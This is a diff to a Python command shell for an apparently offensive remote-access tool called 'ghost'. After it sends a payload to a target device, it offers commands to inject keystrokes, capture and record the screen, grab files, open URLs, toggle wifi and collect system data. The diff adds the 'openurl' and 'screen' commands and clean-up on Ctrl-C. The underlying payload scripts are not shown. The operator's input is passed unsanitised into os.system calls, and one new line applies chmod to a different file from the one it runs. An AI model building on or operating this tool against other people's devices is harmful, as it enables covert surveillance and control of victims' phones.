@@ -27,7 +27,6 @@ import subprocess
 import readline
 import time
 
-I = '\033[1;77m[i] \033[0m'
 Q = '\033[1;77m[?] \033[0m'
 G = '\033[1;34m[*] \033[0m'
 S = '\033[1;32m[+] \033[0m'
@@ -54,7 +53,11 @@ def banner():
     print("")
 
 def main():
-    ui = input('\033[4mghost\033[0m> ').strip(" ")
+    try:
+        ui = input('\033[4mghost\033[0m> ').strip(" ")
+    except:
+        os.system("chmod +x core/server.sh && core/server.sh stop")
+        sys.exit()
     ui = ui.split()
     while True:
         if ui == []:
@@ -98,7 +101,12 @@ def main():
                 print(G+"Sending payload to "+target+"...")
                 time.sleep(1)
                 device = target
-                con = input('\033[4mghost\033[0m(\033[1;31m'+device+'\033[0m)> ').strip(" ")
+                try:
+                    con = input('\033[4mghost\033[0m(\033[1;31m'+device+'\033[0m)> ').strip(" ")
+                except:
+                    os.system("chmod +x core/dctl.sh && core/dctl.sh disconnect "+target)
+                    os.system("chmod +x core/server.sh && core/server.sh stop")
+                    sys.exit()
                 con = con.split()
                 while True:
                     if con == []:
@@ -148,8 +156,8 @@ def main():
                     elif con[0] == "recovery":
                         os.system("chmod +x data/payloads/recovery && data/payloads/recovery")
                     elif con[0] == "keyboard":
-                        print("Press Ctrl-C to stop.")
-                        print("Device keyboard:")
+                        print(I+"Press Ctrl-C to stop.")
+                        print(I+"Device keyboard:")
                         try:
                             while True:
                                 text = input()
@@ -174,6 +182,11 @@ def main():
                                 print(E+"Keycode is not found!")
                     elif con[0] == "battery":
                         os.system("chmod +x data/payloads/battery && data/payloads/battery")
+                    elif con[0] == "openurl":
+                        if len(con) < 2:
+                            print("Usage: openurl <url>")
+                        else:
+                            os.system("chmod +x data/payloads/openlink && data/payloads/openurl "+con[1])
                     elif con[0] == "activity":
                         os.system("chmod +x data/payloads/activity && data/payloads/activity")
                     elif con[0] == "netstat":
@@ -184,13 +197,18 @@ def main():
                         os.system("chmod +x data/payloads/sysinfo && data/payloads/sysinfo")
                     elif con[0] == "inet":
                         os.system("chmod +x data/payloads/inet && data/payloads/inet")
+                    elif con[0] == "screen":
+                        print(G+"Opening screen...")
+                        print(I+"Press Ctrl-C to stop.")
+                        os.system("chmod +x data/payloads/screen && data/payloads/screen")
                     elif con[0] == "wifi":
-                        if con[1] == "on":
-                            os.system("chmod +x data/payloads/wifi && data/payloads/wifi on")
-                        elif con[1] == "off":
-                            os.system("chmod +x data/payloads/wifi && data/payloads/wifi off")
-                        else:
+                        if len(con) < 2:
                             print("Usage: wifi [on|off]")
+                        else:
+                            if con[1] == "on":
+                                os.system("chmod +x data/payloads/wifi && data/payloads/wifi on")
+                            elif con[1] == "off":
+                                os.system("chmod +x data/payloads/wifi && data/payloads/wifi off")
                     elif con[0] == "wgrabber":
                         if len(con) < 2:
                             print("Usage: wgrabber <local_path>")
@@ -243,15 +261,15 @@ def main():
                             if os.path.isdir(con[1]):
                                 if os.path.exists(con[1]):
                                     print(G+"Taking screenshot...")
-                                    os.system("chmod +x data/grabber/grabber.sh && data/grabber/grabber.sh -s "+con[1]+"/screenshot.png")
+                                    os.system("chmod +x data/grabber/grabber.sh && data/grabber/grabber.sh -s "+con[1]+"/screen.png")
                                     if con[1][-1] == "/":
-                                        print(G+"Saving to "+con[1]+"screenshot.png...")
+                                        print(G+"Saving to "+con[1]+"screen.png...")
                                         time.sleep(1)
-                                        print(S+"Saved to "+con[1]+"screenshot.png!")
+                                        print(S+"Saved to "+con[1]+"screen.png!")
                                     else:
-                                        print(G+"Saving to "+con[1]+"/screenshot.png...")
+                                        print(G+"Saving to "+con[1]+"/screen.png...")
                                         time.sleep(1)
-                                        print(S+"Saved to "+con[1]+"/screenshot.png!")
+                                        print(S+"Saved to "+con[1]+"/screen.png!")
                                 else:
                                     print(E+"Local directory: "+con[1]+": does not exist!")
                             else:
@@ -279,7 +297,7 @@ def main():
                             if os.path.isdir(con[1]):
                                 if os.path.exists(con[1]):
                                     print(G+"Recording screen...")
-                                    print(G+"Press Ctrl-C to stop.")
+                                    print(I+"Press Ctrl-C to stop.")
                                     os.system("chmod +x data/grabber/grabber.sh && data/grabber/grabber.sh -r "+con[1]+"/screen.mp4")
                                     if con[1][-1] == "/":
                                         print(G+"Saving to "+con[1]+"screen.mp4...")
@@ -301,7 +319,7 @@ def main():
                                     if os.path.isdir(rp):
                                         rp = os.path.split(con[1])[1]
                                         print(G+"Recording screen...")
-                                        print(G+"Press Ctrl-C to stop.")
+                                        print(I+"Press Ctrl-C to stop.")
                                         os.system("chmod +x data/grabber/grabber.sh && data/grabber/grabber.sh -r "+con[1])
                                         print(G+"Saving to "+con[1]+"...")
                                         time.sleep(1)
@@ -418,11 +436,20 @@ def main():
                                 print(E+"Local file: "+con[1]+": does not exist!")
                     else:
                         print(E+"Unrecognized command!")
-                    con = input('\033[4mghost\033[0m(\033[1;31m'+device+'\033[0m)> ').strip(" ")
+                    try:
+                        con = input('\033[4mghost\033[0m(\033[1;31m'+device+'\033[0m)> ').strip(" ")
+                    except:
+                        os.system("chmod +x core/dctl.sh && core/dctl.sh disconnect "+target)
+                        os.system("chmod +x core/server.sh && core/server.sh stop")
+                        sys.exit()
                     con = con.split()
         else:
             print(E+"Unrecognized command!")
-        ui = input('\033[4mghost\033[0m> ').strip(" ")
+        try:
+            ui = input('\033[4mghost\033[0m> ').strip(" ")
+        except:
+            os.system("chmod +x core/server.sh && core/server.sh stop")
+            sys.exit()
         ui = ui.split()
 
 start_server()
